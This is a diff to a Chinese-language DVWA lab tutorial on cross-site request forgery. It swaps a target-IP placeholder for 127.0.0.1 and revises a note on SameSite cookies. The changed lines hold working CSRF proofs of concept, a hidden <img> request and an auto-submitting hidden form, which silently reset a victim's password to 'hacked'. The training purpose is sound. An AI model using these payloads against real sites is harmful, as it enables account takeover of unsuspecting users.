@@ -48,7 +48,7 @@ if (isset($_GET['Change'])) {
 在 DVWA 页面输入新密码和确认密码，点击 Change，URL 变为：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change
+http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change
 ```
 
 页面提示 `Password Changed.`，密码修改成功。
@@ -66,7 +66,7 @@ http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123
 </head>
 <body>
     <p>正在加载…</p>
-    <img src="http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change" style="display:none;">
+    <img src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change" style="display:none;">
 </body>
 </html>
 ```
@@ -76,7 +76,7 @@ http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123
 > **两个注意点**
 >
 > 1. `<head>` 里必须写 `<meta charset="utf-8">`，文件也要按 UTF-8 保存，否则浏览器会按 GBK 解码，页面上的「正在加载…」会显示成乱码。
-> 2. **SameSite 会拦这一招**：Chrome 80 起 Cookie 默认 `SameSite=Lax`，跨站的子资源请求（`img` / `script` / `iframe`）不带 Cookie，所以 `<img>` 版本在现在的 Chrome 上大多改不了密码（Firefox 或 `SameSite=None` 的老环境才行）。下面用表单提交更可靠。
+> 2. **SameSite 只在「跨站」时拦住它**：Chrome 80 起 Cookie 默认 `SameSite=Lax`，跨站的子资源请求（`img` / `script` / `iframe`）不带 Cookie。本地复现时攻击页和靶场都在 `127.0.0.1` 上，属于**同站**，`<img>` 版能打通；只有把攻击页放到别的域名上才会被拦，那时要改用下面的表单版。
 
 也可以使用隐藏表单自动提交：
 
@@ -88,7 +88,7 @@ http://靶机IP/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123
     <title>CSRF Low PoC</title>
 </head>
 <body onload="document.csrf_form.submit()">
-    <form name="csrf_form" action="http://靶机IP/dvwa/vulnerabilities/csrf/" method="GET">
+    <form name="csrf_form" action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="GET">
         <input type="hidden" name="password_new" value="hacked">
         <input type="hidden" name="password_conf" value="hacked">
         <input type="hidden" name="Change" value="Change">
